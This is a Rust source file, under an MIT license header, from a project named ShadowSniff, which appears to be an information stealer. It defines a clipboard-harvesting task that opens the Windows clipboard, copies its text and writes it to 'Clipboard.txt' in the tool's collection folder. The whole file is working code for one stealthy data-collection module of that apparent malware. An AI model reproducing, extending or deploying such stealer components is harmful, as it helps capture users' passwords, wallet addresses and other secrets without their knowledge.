/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use alloc::string::String;
use collector::Collector;
use core::ptr::{null_mut, slice_from_raw_parts};
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use tasks::{Task, parent_name};
use windows_sys::Win32::System::DataExchange::{CloseClipboard, GetClipboardData, OpenClipboard};
use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};

pub(super) struct ClipboardTask;

impl<C: Collector, F: FileSystem> Task<C, F> for ClipboardTask {
    parent_name!("Clipboard.txt");

    fn run(&self, parent: &Path, filesystem: &F, _: &C) {
        if unsafe { OpenClipboard(null_mut()) } == 0 {
            return;
        }

        let handle = unsafe { GetClipboardData(13u32) };
        if handle.is_null() {
            return;
        }

        let ptr = unsafe { GlobalLock(handle) };
        if ptr.is_null() {
            unsafe {
                CloseClipboard();
            }
            return;
        }

        let mut len = 0;
        let mut cur = ptr as *const u16;
        unsafe {
            while *cur != 0 {
                len += 1;
                cur = cur.add(1);
            }
        }

        let slice = slice_from_raw_parts(ptr as *const u16, len);
        let str = unsafe { String::from_utf16_lossy(&*slice) };

        unsafe {
            GlobalUnlock(handle);
            CloseClipboard();
        }

        let str = str.trim();
        if str.is_empty() {
            return;
        }

        let _ = str.write_to(filesystem, parent);
    }
}
